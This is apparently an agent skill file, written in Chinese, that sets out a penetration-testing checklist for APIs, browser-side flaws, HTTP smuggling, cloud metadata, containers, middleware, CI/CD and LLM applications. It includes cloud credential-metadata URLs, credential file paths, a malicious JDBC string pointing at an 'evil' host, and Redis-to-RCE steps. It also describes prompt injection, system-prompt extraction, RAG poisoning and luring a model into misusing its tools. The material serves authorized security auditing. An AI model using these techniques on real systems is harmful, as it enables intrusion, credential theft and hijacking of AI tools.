---
name: modern-attack-surface
description: 传统 Web 之外的攻击面：REST/GraphQL/gRPC API、WebSocket、CORS 与前端现代漏洞（原型链污染/postMessage/DOM clobbering）、HTTP 协议层（Host 头/缓存投毒/请求走私）、云元数据与对象存储、容器 K8s、非 HTTP 中间件（Redis/ES/Dubbo/JDBC）、供应链 CI/CD、LLM 与 MCP 应用面。目标不是纯单体 Web、或 SSRF 打内网、或审 API/前端/云/AI 应用时使用。
---

# 现代攻击面补充

传统单体 Web 清单覆盖不到的面。**先判目标形态**，再挑对应章节——不要整章硬套。

```
单体 Web（JSP/PHP/Rails/Django）→ 主看 M3（协议层）、M6（中间件）
前后端分离 + REST/API          → M1 M2 M3
含 SSO/第三方登录              → 见 auth-authz-testing
上云 / 容器部署                → M4 M5
有 AI/大模型功能               → M8
任何有依赖管理的项目           → M7
```

## M1 API 专项

### REST

- **版本残留**：`/api/v1` 已加固，`/api/v0`、`/api/old`、`/api/internal`、`/api/test` 还在裸奔。逐个试。
- **规格泄露一次拿全端点**：`/swagger.json` `/v2/api-docs` `/v3/api-docs` `/openapi.json` `/swagger-ui/index.html` `/actuator/mappings` `/api-docs` `/graphql`（各栈等价：Django `/api/schema/`、Rails `/rails/info/routes`、Laravel `php artisan route:list` 残留、FastAPI `/docs` `/openapi.json`、NestJS `/api-json`）。拿到即得完整路由清单——比爆破高效百倍。
- **批量端点**：`/api/users/batch`、`ids=1,2,3`——单条有鉴权、批量没有。
- **方法差异**：`GET` 挡了 `POST` 没挡；`X-HTTP-Method-Override: DELETE` 绕方法级鉴权。
- **内容协商差异**：`application/json` 挡了，`x-www-form-urlencoded` / `text/plain` / `application/xml` 走另一条解析路径（同时是 CSRF 与 XXE 入口）。
- **Mass Assignment（批量赋值）**：请求体直接绑定到实体，多传 `"role":"admin"` / `"isVip":true` / `"balance":99999`。各栈锚点见 `language-stack-audit`。**没有字段白名单的绑定 = 必测。**
- **HPP 参数污染**：`?id=1&id=2`——WAF 看第一个、后端取最后一个；或数组化 `id[]=1&id[]=2` 让类型判断失效。

### GraphQL

```bash
curl -s -X POST http://TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

- introspection 关了也可试 `__typename`、字段爆破、Apollo 的 "Did you mean ...?" 提示泄露字段名。
- **别名批量放大**：同一 mutation 用 N 个 alias 一次发 → 绕过限速/验证码/一次性限制，也是竞态利器。
- **深度嵌套 DoS**：`user{friends{friends{...}}}`——生产环境注意红线，控制深度。
- **字段级越权**：列表接口不返回的 `email/phone/idCard`，直接点名要就给了。
- **结构性风险**：所有操作同一个 URL `/graphql` → **路径级鉴权拦截器全部失效**；query 有鉴权而 mutation 漏掉是高频。
- **batching** 数组请求绕过限速与审计日志。

### gRPC / RPC / 消息队列

- **反射服务开启** = 等价 introspection：`grpcurl -plaintext TARGET:port list`。
- 鉴权常只在网关做，**直连后端端口无鉴权**。
- JVM 生态：Dubbo/RMI/JMX/Hessian **反序列化**是 RCE 直通车。
- MQ（Kafka/RabbitMQ/RocketMQ）：消费端把消息内容当可信数据 → 消息即 Source；能投递消息就能打消费端的反序列化/注入。

### WebSocket

- **CSWSH（跨站 WebSocket 劫持）**：握手只靠 Cookie 且**不校验 Origin** → 攻击者页面直接建连并以受害者身份操作。WebSocket 的头号问题。
- 鉴权只在**握手时**做，之后消息不再校验 → 建连后发别人的资源 id 就是越权。
- 消息体是完整的注入面（SQLi/命令/反序列化），且常绕过所有 HTTP WAF。
- 无限速 / 无消息大小限制。

```bash
curl -s -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" \
  -H "Origin: https://evil.com" -b "$SESS" "http://TARGET/ws" | head -1
```

### Webhook / 回调

- 回调地址用户可控 → SSRF。
- 回调**签名校验缺失 / 时序不安全比较 / 密钥硬编码** → 可伪造第三方通知（支付回调伪造 = 免费下单）。
- 回调可重放（无 nonce/时间戳窗口）→ 重复发货/重复入账。

## M2 前端与浏览器侧

- **CORS 配置错误**（高频、易漏）：
  - `Access-Control-Allow-Origin` **反射请求 Origin** + `Allow-Credentials: true` = 任意站点读取用户数据。
  - 允许 `null`（沙箱 iframe / 重定向可产生）。
  - 后缀/前缀匹配：`evil-example.com`、`example.com.evil.com`。
  - 允许任意子域 + 某子域有 XSS = 主站数据泄露。

```bash
for o in "https://evil.com" "null" "https://TARGET.evil.com" "https://evil.TARGET"; do
  printf "%-28s " "$o"
  curl -s -o /dev/null -D- -H "Origin: $o" "http://TARGET/api/me" \
    | grep -i "access-control-allow-\(origin\|credentials\)" | tr '\n' ' '; echo
done
```

判定：**回显了你发的 Origin 且 credentials=true → 成立。**

- **postMessage**：监听端不校验 `event.origin` → 任意站点可发消息；数据进 `innerHTML/eval` = XSS。发送端用 `'*'` 作 targetOrigin 会泄露敏感数据。
- **原型链污染**：客户端（深合并 / query 解析 `?__proto__[x]=y`）与服务端（Node 处理用户 JSON）。服务端污染可升级 RCE。锚点：`merge(`、`deepExtend`、`Object.assign(target, userInput)`、`__proto__`、`constructor.prototype`。
- **DOM Clobbering**：HTML 注入受限（不能执行脚本）时，用 `<a id=x>` 覆盖 JS 全局变量改变逻辑——白名单富文本场景要测。
- **CSP**：有没有？`unsafe-inline` / `unsafe-eval` / 宽泛白名单（含可上传 JS 的 CDN）/ `object-src` 未限 / `nonce` 是否每次刷新。没有 CSP 不算漏洞但要写进加固建议；有 CSP 但可绕要写清绕法。
- **安全响应头基线**：`X-Content-Type-Options` `X-Frame-Options`/`frame-ancestors`（点击劫持）`Referrer-Policy` `Strict-Transport-Security` `Permissions-Policy`。
- **source map / 源码泄露**：`.js.map`、`webpack://` 路径、未删注释与内网地址、前端硬编码 AK/SK 与内部接口。
- **前端鉴权幻觉**：路由守卫/按钮隐藏都是 UI。前端拿到的完整菜单/权限 JSON 就是**管理端点清单**——直接拿来当字典。
- **token 存 localStorage**（XSS 即接管，属设计缺陷要点名）；第三方 SDK（统计/客服/埋点）回传敏感字段。

## M3 HTTP 协议层

- **Host 头攻击**：服务端用 `Host` 拼绝对 URL → 密码重置链接投毒（链接指向攻击者域，受害者一点 token 就到手）、缓存投毒。测 `Host:`、`X-Forwarded-Host`、`X-Host`、绝对 URI 请求行。
- **Web 缓存投毒**：找**未进缓存键**但影响响应的输入（`X-Forwarded-Host`、`X-Original-URL`、多余参数），污染后所有人吃到你的 payload。
- **缓存欺骗**：`/account/profile.css`——后端忽略后缀返回私有数据，CDN 按后缀缓存成静态文件 → 别人能读到。
- **请求走私**：CL.TE / TE.CL / TE.TE；HTTP/2 降级走私、H2C 升级绕过前置鉴权。**前后端解析差异 = 前置鉴权全线失效**。生产环境注意影响面，红线内谨慎。
- **CRLF / 头注入**：参数进响应头（Location、Set-Cookie）未过滤 `%0d%0a` → 拆响应、注入 Cookie、XSS。
- **反代与后端路径理解差异**：`/admin/..%2f`、`;` 参数、双编码——网关认为不是 `/admin` 而后端认为是。变形手法同 `blackbox-testing`，但**根因是两套解析器**。

## M4 云与元数据（SSRF 的最高价值目标）

拿到 SSRF 后打点优先级：

| 目标 | 地址 | 收益 |
|---|---|---|
| AWS IMDS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | 临时凭据 → 云账户 |
| IMDSv2 | 需 `PUT /latest/api/token` + `X-aws-ec2-metadata-token` | 同上（能带头的 SSRF 仍可打） |
| 阿里云 | `http://100.100.100.200/latest/meta-data/ram/security-credentials/` | 同上 |
| GCP | `http://metadata.google.internal/computeMetadata/v1/`（需 `Metadata-Flavor: Google`） | 同上 |
| Azure | `http://169.254.169.254/metadata/identity/oauth2/token`（需 `Metadata: true`） | 同上 |
| K8s | `https://kubernetes.default.svc` + `/var/run/secrets/kubernetes.io/serviceaccount/token` | 集群权限 |

**旁路**：任意文件读同样能拿云凭据——`~/.aws/credentials`、`~/.kube/config`、`/proc/self/environ`、`/proc/self/cmdline`（含命令行传入的密码）。

> **定级放大**：任意文件读 / SSRF + 云部署，影响可能是「云账户接管」而不只是「读文件」。P5 定级要把这条链算进去。

**对象存储**：桶名可从前端 URL 得到 → 桶列举（`?list-type=2`）、匿名写（能写 = 篡改前端 JS = 全站 XSS）、ACL 过宽、预签名 URL 可改路径/无过期、CDN 回源未鉴权（绕过应用层直接读源站）。

## M5 容器 / 编排（授权范围内）

| 面 | 端口/路径 | 后果 |
|---|---|---|
| Docker API 未认证 | 2375/2376 | 起特权容器 = 宿主 root |
| kubelet | 10250 / 10255 | `/run/…/exec` 命令执行 |
| K8s API 匿名 | 6443 / 8080 | 集群接管 |
| etcd 未认证 | 2379 | 全量 secret |
| ServiceAccount token | 容器内 `/var/run/secrets/...` | 横向 |
| 逃逸线索 | 特权容器、挂载 docker.sock、CAP_SYS_ADMIN、宿主目录挂载 | 逃逸 |

## M6 非 HTTP 中间件（端口扫描后必做，常被跳过）

P1 扫出的非 Web 端口不要只记录不测：

| 服务 | 端口 | 快速判定 | 后果 |
|---|---|---|---|
| Redis | 6379 | 无密码 `PING` 返回 PONG | 写 crontab/webshell/SSH key → RCE |
| MongoDB | 27017 | 无认证连上 | 全库 |
| Elasticsearch | 9200 | `curl T:9200/_cat/indices` | 全量数据 |
| Memcached | 11211 | `stats` | 缓存内会话/token |
| Zookeeper | 2181 | `echo stat \| nc` | 配置/凭据 |
| Kafka | 9092 | 无认证消费 | 业务数据流 |
| RMI / JMX | 1099 / 1090+ | 可注册 | **反序列化 RCE** |
| Dubbo | 20880 | telnet `ls` | 泛化调用 RCE |
| LDAP | 389 | 匿名 bind | 全量账号 |
| SMB/FTP/NFS | 445/21/2049 | 匿名 | 文件泄露 |
| 数据库 | 3306/1433/5432/1521 | 默认口令（**红线：试一次 ≠ 爆破，超出请遵 P0 红线**） | 全库 |

**连接串攻击**（凡是"用户可填数据库/服务连接串"的功能——数据源管理、数据同步、报表配置——都是 RCE 候选）：

- JDBC：`jdbc:mysql://evil/?autoDeserialize=true&queryInterceptors=...` → 客户端反序列化 RCE；H2 `INIT=RUNSCRIPT` → RCE。
- 其他栈同理：Python `sqlalchemy` URL、Node 连接串、PHP PDO DSN——都能指向攻击者服务器触发客户端解析漏洞。

## M7 供应链与 CI/CD

- **依赖混淆**：私有包名在公共源不存在 → 抢注同名高版本。查各栈 registry 配置的优先级与 scope：`.npmrc`、Maven `settings.xml`、`pip.conf`/`requirements.txt` 的 `--extra-index-url`、`Gemfile` source、`go.mod` GOPRIVATE、`composer.json` repositories。
- **lockfile 完整性**：无 lockfile / 版本范围过宽（`^` `*` `latest`）/ integrity 缺失。
- **仓库与配置泄露**：`.git`（`git-dumper` 还原全史，含被删的密钥）、`.svn`、`.hg`、`.env`、`.DS_Store`、`Dockerfile`、`docker-compose.yml`、`.gitlab-ci.yml`、`.github/workflows`、`application-*.yml`、`settings.py`、`config/database.yml`、`wp-config.php.bak`。
- **镜像层泄密**：`docker history` / 被 `rm` 但仍留在下层的密钥。
- **CI 配置注入**：`pull_request_target` + 检出 PR 代码；脚本里直接插值不可信输入（分支名/PR 标题/issue 内容）→ CI 环境 RCE + secret 外泄。
- **制品未签名 / 更新通道无校验** → 供应链投毒。

```bash
grep -rniE '(api[_-]?key|secret|token|password|BEGIN (RSA|EC|OPENSSH) PRIVATE)' \
  .env* .git* Dockerfile* docker-compose* .github .gitlab-ci.yml 2>/dev/null
```

## M8 LLM / AI 应用面（目标含大模型功能时）

| 面 | 缺陷 | 判定 |
|---|---|---|
| **直接 prompt 注入** | 用户输入能改写系统指令 | 让它输出系统提示 / 忽略先前指令 |
| **间接 prompt 注入** | 模型读取的外部内容（网页、文档、邮件、RAG 语料、工具返回）里藏指令 | 在可被检索的内容里埋指令看是否被执行——**AI 应用头号高危** |
| **工具/函数越权** | 模型可调用的工具没有独立授权，"模型决定"＝"用户授权" | 诱导模型调用高权限工具（改数据、发消息、读他人数据） |
| **输出被直接信任** | 模型输出进 `innerHTML`（XSS）/ `exec`（RCE）/ SQL（注入）/ 请求（SSRF） | 让模型输出恶意 payload |
| **RAG 越权检索** | 向量库不按用户/租户过滤 | 提问诱导跨租户内容 |
| **RAG 投毒** | 任何用户可写入的内容进入知识库 | 写入带指令的文档 |
| **系统提示/密钥泄露** | 系统提示含密钥、内部 URL、业务规则 | 提取 |
| **MCP / 插件** | MCP server 权限过宽、工具描述可被投毒、凭据存放 | 审工具清单与权限边界 |
| **成本型 DoS** | 无限速 / 无 token 上限 | 长上下文放大（红线内评估，勿实打） |

**审计心法：把「模型」当成一个永远可能被说服、却持有其全部工具权限的用户。授权必须在工具侧做，靠提示词约束等于没有约束。**

## 产出

本 skill 每节命中的面都要 `record_surface`——**包括"已测·无"的结论**，否则 P7 矩阵仍是空格。缺陷 `add_finding`；SSRF/文件读命中云凭据路径时按放大后的影响定级，并在 finding 里写清链条。
